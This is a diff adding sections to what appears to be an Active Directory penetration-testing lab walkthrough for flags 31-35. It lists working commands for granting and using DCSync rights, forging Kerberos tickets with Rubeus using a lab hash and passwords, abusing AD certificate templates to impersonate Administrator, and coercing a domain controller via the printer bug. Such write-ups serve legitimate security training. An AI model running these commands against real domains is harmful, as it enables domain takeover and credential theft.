@@ -813,3 +813,98 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args silver /service:http/u
 ```
 {% endcode %}
 
+## Flag 31 - DCSync
+
+Check if we have DCSync rights with PowerView
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser64"}
+</strong></code></pre>
+
+We got no output, so we don't have permissions.
+
+Set DCSync right on studentuser64 using a ticket from a domain administrator
+
+{% code overflow="wrap" %}
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```powershell
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+```
+{% endcode %}
+
+And now i could DCSync with studentuser64
+
+## Flag 32/33/34 - ADCS
+
+To enumerate use Certify
+
+```
+C:\AD\Tools\Certify.exe /find
+```
+
+<figure><img src="../.gitbook/assets/immagine (27).png" alt=""><figcaption></figcaption></figure>
+
+We already have pwadmin and with the enrollment rights we can request a crtificates for any user.
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (28).png" alt=""><figcaption></figcaption></figure>
+
+Now copy the certificate and convert it using the suggested command
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -outC:\AD\Tools\DA.pfx
+```
+{% endcode %}
+
+And now request a ticket using the certificate
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:pass  /nowrap /ptt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (29).png" alt=""><figcaption></figcaption></figure>
+
+## Flag 35 - Unconstrained Delegation over parent domain
+
+Remember that webmaster has unconstrained delegation, so we can use it to obatin a ticket for a enterprise admin. So craft a ticket as webmaster and transfer the loader on us-web to start rubeus as a monitor
+
+{% code overflow="wrap" %}
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:TECHCORP-DC$ /interval:5 /nowrap
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (30).png" alt=""><figcaption></figcaption></figure>
+
+Now by abusing the printer bug we can request a ticket with MS-RPRN.exe
+
+```
+C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
+```
+
+The next steps are the same from the previous Unconstrained Delegation.
+
